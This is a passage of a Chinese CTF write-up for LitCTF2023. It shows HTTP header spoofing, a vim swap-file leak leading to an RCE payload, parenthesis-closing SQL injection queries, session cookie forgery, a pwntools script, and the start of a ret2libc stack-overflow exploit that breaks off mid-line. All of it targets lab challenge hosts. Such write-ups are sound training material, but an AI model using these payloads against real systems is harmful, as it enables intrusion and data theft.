id=\"8-http-pro-max-plus\"><a class=\"markdownIt-Anchor\" href=\"#8-http-pro-max-plus\">#</a> 8、Http pro max plus</h2>\n<p>​\t这题… 难蚌。</p>\n<p>​\t先是一堆请求头绕过，直接上：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Chrome</span><br><span class=\"line\">Client-Ip:127.0.0.1</span><br><span class=\"line\">via:Clash.win</span><br><span class=\"line\"><span class=\"attribute\">referer</span><span class=\"punctuation\">: </span>pornhub.com</span><br></pre></td></tr></table></figure>\n<p>​\t之后提示访问 /wtfwtfwtfwtf.php 文件</p>\n<p>​\t访问了之后看源码又要访问 /sejishikong.php 文件，之后得到 flag：</p>\n<blockquote>\n<p>冲完啦？拿上你的 flag 赶紧走</p>\n</blockquote>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;714b395b-2dfd-4657-8b5b-c82d04fad401&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"9-vim-yyds\"><a class=\"markdownIt-Anchor\" href=\"#9-vim-yyds\">#</a> 9、Vim yyds：</h2>\n<p>​\t访问 /.index.php.swp 之后通过 vim -r index.php.swp 获取源码（vim 泄露）：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text/css&quot;</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">body</span>,</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">html</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">display</span>: flex;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">align-items</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">justify-content</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">div</span><span class=\"selector-class\">.vim</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">display</span>: flex;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">align-content</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">vertical-align</span>: middle;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">justify-content</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">img</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">border</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">width</span>: <span class=\"number\">8rem</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">height</span>: auto;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">h1</span><span class=\"selector-class\">.vim_yyds</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">color</span>: <span class=\"number\">#50f728</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">display</span>: flex;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">align-items</span>: flex-start;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">justify-content</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">margin-top</span>: <span class=\"number\">50</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">margin-left</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">h3</span><span class=\"selector-class\">.vim_said</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">color</span>: <span class=\"number\">#39c2ff</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">display</span>: flex;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">justify-content</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">align-items</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">        br,</span></span><br><span class=\"line\"><span class=\"language-css\">        <span class=\"selector-tag\">p</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">            <span class=\"attribute\">font-size</span>: <span class=\"number\">20</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">        &#125;</span></span><br><span class=\"line\"><span class=\"language-css\">    </span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">main</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;vim&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;https://www.bing.com/th?id=OSAAS.7B95FA2D97CE022F5E7949F60E350A25&amp;pid=TechQna&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">img</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;vim_yyds&quot;</span>&gt;</span></span><br><span class=\"line\">                Vim yyds</span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">h3</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;vim_said&quot;</span>&gt;</span></span><br><span class=\"line\">            队里师傅说Vim是世界上最好的编辑器，不接受反驳</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;can_can_vim&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"meta\">            error_reporting(0);</span></span><br><span class=\"line\"><span class=\"meta\">            $password = &quot;Give_Me_Your_Flag&quot;;</span></span><br><span class=\"line\"><span class=\"meta\">            echo &quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;;</span></span><br><span class=\"line\"><span class=\"meta\">            if ($_POST[&#x27;password&#x27;] === base65_encode($password)) &#123;</span></span><br><span class=\"line\"><span class=\"meta\">                echo &quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;;</span></span><br><span class=\"line\"><span class=\"meta\">                eval(system($_POST[&#x27;cmd&#x27;]));</span></span><br><span class=\"line\"><span class=\"meta\">            &#125;</span></span><br><span class=\"line\"><span class=\"meta\">            ?&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">main</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t注意这儿：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">            <span class=\"title function_ invoke__\">error_reporting</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">            <span class=\"variable\">$password</span> = <span class=\"string\">&quot;Give_Me_Your_Flag&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;can can need Vim &lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;password&#x27;</span>] === <span class=\"title function_ invoke__\">base65_encode</span>(<span class=\"variable\">$password</span>)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;Oh You got my password!&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">                <span class=\"keyword\">eval</span>(<span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>​\t把 Give_Me_Your_Flag 进行 base64 编码之后得到：R2l2ZV9NZV9Zb3VyX0ZsYWc=，之后 POST 传入，然后进行 rce，payload 如下：</p>\n<blockquote>\n<p>password=R2l2ZV9NZV9Zb3VyX0ZsYWc=&amp;cmd=cat /flag</p>\n</blockquote>\n<p>​\tflag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;550f422b-6b60-4216-828a-4521b82fe56f&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"10-这是什么sql-注一下\"><a class=\"markdownIt-Anchor\" href=\"#10-这是什么sql-注一下\">#</a> 10、这是什么？SQL ！注一下 ！</h2>\n<p>​\t发现给了一句源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$sql</span> = <span class=\"string\">&quot;SELECT username,password FROM users WHERE id = &quot;</span>.<span class=\"string\">&#x27;((((((&#x27;</span>.<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;id&quot;</span>].<span class=\"string\">&#x27;))))))&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$result</span> = <span class=\"variable\">$conn</span>-&gt;<span class=\"title function_ invoke__\">query</span>(<span class=\"variable\">$sql</span>);</span><br></pre></td></tr></table></figure>\n<p>​\t由于前半部分存在多个 (，因此后边需要对括号进行闭合，之后和寻常的 sql 注入一样：</p>\n<p>​\t查数据库：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span>))))))<span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,group_concat(schema_name) <span class=\"keyword\">from</span> information_schema.schemata<span class=\"comment\">--+</span></span><br></pre></td></tr></table></figure>\n<p>​\t查表：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span>))))))<span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,group_concat(table_name) <span class=\"keyword\">from</span> information_schema.tables <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span><span class=\"string\">&#x27;ctftraining&#x27;</span><span class=\"comment\">--+</span></span><br></pre></td></tr></table></figure>\n<p>​\t查字段名：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span>))))))<span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,group_concat(column_name) <span class=\"keyword\">from</span> information_schema.columns <span class=\"keyword\">where</span> table_schema<span class=\"operator\">=</span><span class=\"string\">&#x27;ctftraining&#x27;</span><span class=\"comment\">--+</span></span><br></pre></td></tr></table></figure>\n<p>​\t查 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;d97bb244-e6e7-4ee9-b764-2a28571532e5&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id<span class=\"operator\">=</span><span class=\"number\">1</span>))))))<span class=\"keyword\">union</span> <span class=\"keyword\">select</span> <span class=\"number\">1</span>,flag <span class=\"keyword\">from</span> ctftraining.flag<span class=\"comment\">--+</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"11-flag点击就送\"><a class=\"markdownIt-Anchor\" href=\"#11-flag点击就送\">#</a> 11、Flag 点击就送！</h2>\n<p>​\t随便输入一个 1，之后提示只有管理员能进，应该是 Cookie 伪造，那么看一下 Cookie，</p>\n<blockquote>\n<p>session=eyJuYW1lIjoiMSJ9.Zmbx8g.9zpH8poegrPcOfauIe1GtO1ht64</p>\n</blockquote>\n<p>​\t应该是 session 伪造，猜测 key 为 LitCTF，修改 1 为 admin，最后拿到 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;fdbe1619-9458-4e89-84fa-6e9b308e5507&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn：</h1>\n<h2 id=\"1-只需要nc一下~\"><a class=\"markdownIt-Anchor\" href=\"#1-只需要nc一下~\">#</a> 1、只需要 nc 一下～</h2>\n<p>​\t呜呜呜，这个题我竟然懵逼了，最后发现是在环境变量中 (&gt;_&lt;)。</p>\n<p>​\t直接 nc 之后 echo $FLAG 即可获得 flag：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;548baafa-2de1-41c7-aafe-29b90be4f940&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-口算题卡\"><a class=\"markdownIt-Anchor\" href=\"#2-口算题卡\">#</a> 2、口算题卡</h2>\n<p>​\tnc 连接之后发现是一个加减法运算（？）</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@MSI:/mnt/c/Users/20820/Downloads# nc node4.anna.nssctf.cn 28007</span><br><span class=\"line\"></span><br><span class=\"line\"> __           ________      _________   ______       _________   ______</span><br><span class=\"line\">/_/\\         /_______/\\    /________/\\ /_____/\\     /________/\\ /_____/\\</span><br><span class=\"line\">\\:\\ \\        \\__.::._\\/    \\__.::.__\\/ \\:::__\\/     \\__.::.__\\/ \\::::_\\/_</span><br><span class=\"line\"> \\:\\ \\          \\::\\ \\        \\::\\ \\    \\:\\ \\  __      \\::\\ \\    \\:\\/___/\\</span><br><span class=\"line\">  \\:\\ \\____     _\\::\\ \\__      \\::\\ \\    \\:\\ \\/_/\\      \\::\\ \\    \\:::._\\/</span><br><span class=\"line\">   \\:\\/___/\\   /__\\::\\__/\\      \\::\\ \\    \\:\\_\\ \\ \\      \\::\\ \\    \\:\\ \\</span><br><span class=\"line\">    \\_____\\___________________   \\__\\_____ \\_____\\______  \\__\\/     \\_\\/</span><br><span class=\"line\">          /_____/\\     /_____/\\     /_____/\\     /_____/\\</span><br><span class=\"line\">          \\:::_:\\ \\    \\:::_ \\ \\    \\:::_:\\ \\    \\:::_:\\ \\</span><br><span class=\"line\">              _\\:\\|     \\:\\ \\ \\ \\       _\\:\\|       /_\\:\\ \\</span><br><span class=\"line\"> _______     /::_/__     \\:\\ \\ \\ \\     /::_/__      \\::_:\\ \\</span><br><span class=\"line\">/______/\\    \\:\\____/\\    \\:\\_\\ \\ \\    \\:\\____/\\    /___\\:\\ &#x27;</span><br><span class=\"line\">\\__::::\\/     \\_____\\/     \\_____\\/     \\_____\\/    \\______/</span><br><span class=\"line\"></span><br><span class=\"line\">Welcome to the LitCTF2023 Verbal Problem Card!</span><br><span class=\"line\">You will be presented with 100 addition and subtraction problems.</span><br><span class=\"line\">Your goal is to answer all of them correctly to get the flag!</span><br><span class=\"line\">if you wrong, you will be kicked out of the game.</span><br><span class=\"line\">Good luck &amp; Have fun!</span><br></pre></td></tr></table></figure>\n<p>​\t推测需要加减到一定数目才会出 flag，试试吧，exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = remote(<span class=\"string\">&quot;node4.anna.nssctf.cn&quot;</span>,<span class=\"number\">28007</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;Have fun!\\n&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">100</span>):</span><br><span class=\"line\">    io.recvuntil(<span class=\"string\">b&quot;What is&quot;</span>)</span><br><span class=\"line\">    key = io.recvuntil(<span class=\"string\">b&quot;?&quot;</span>)</span><br><span class=\"line\">    payload = flat([</span><br><span class=\"line\">        <span class=\"built_in\">str</span>(<span class=\"built_in\">eval</span>(key[:-<span class=\"number\">1</span>]))</span><br><span class=\"line\">    ])</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"built_in\">eval</span>(key[:-<span class=\"number\">1</span>]))</span><br><span class=\"line\">    io.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p>​\t最后得到 flag：Congratulations! Here’s your flag:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">NSSCTF&#123;757d9dc8-d946-4f97-9370-63876e41aeaf&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-狠狠的溢出涅~\"><a class=\"markdownIt-Anchor\" href=\"#3-狠狠的溢出涅~\">#</a> 3、狠狠的溢出涅～</h2>\n<p>​\t检查保护：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@MSI:/mnt/c/Users/20820/Downloads/ubuntu_pwn# checksec pwn4</span><br><span class=\"line\">[*] &#x27;/mnt/c/Users/20820/Downloads/ubuntu_pwn/pwn4&#x27;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<p>​\tIDA 反编译；</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __fastcall <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">91</span>]; <span class=\"comment\">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int8 v5; <span class=\"comment\">// [rsp+6Bh] [rbp-5h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// [rsp+6Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v6 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setbuf(<span class=\"built_in\">stderr</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Leave your message:&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">0x200</span>uLL);</span><br><span class=\"line\">  v5 = <span class=\"built_in\">strlen</span>(buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v5 &gt; <span class=\"number\">0x50</span>u )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;hacker&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Ok,Message Received&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t发现存在栈溢出漏洞，但是，也存在过滤，就是获取 buf 的大小，然后与 0x50u 进行大小比较，没有后门函数，那么就是个 ret2libc，直接套公式做了。</p>\n<p>​\t先通过 puts 函数泄露 puts 函数本身的真实地址，之后通过 libc 文件或者 LibcSearcher 库查版本拿 system 和 /bin/sh 的地址，exp 如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context (os=<span class=\"string\">&#x27;linux&#x27;</span>, arch=<span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>,<span class=\"string\">&#x27;splitw&#x27;</span>,<span class=\"string\">&#x27;-h&#x27;</span>,<span class=\"string\">&#x27;-l&#x27;</span>,<span class=\"string\">&#x27;140&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">pwnfile = <span class=\"string\">&#x27;./pwn4&#x27;</span></span><br><span class=\"line\">elf = ELF(pwnfile)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#io = process(pwnfile)</span></span><br><span class=\"line\">io = remote(<span class=\"string\">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class=\"number\">28607</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x4007d3</span></span><br><span class=\"line\">pop_ret = <span class=\"number\">0x400556</span></span><br><span class=\"line\">puts_plt = elf.plt[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">main_addr = <span class=\"number\">0x4006B0</span></span><br><span class=\"line\">pay = <span class=\"string\">b&#x27;\\x00&#x27;</span> * (<span class=\"number\">0x60</span>+<span class=\"number\">8</span>) + 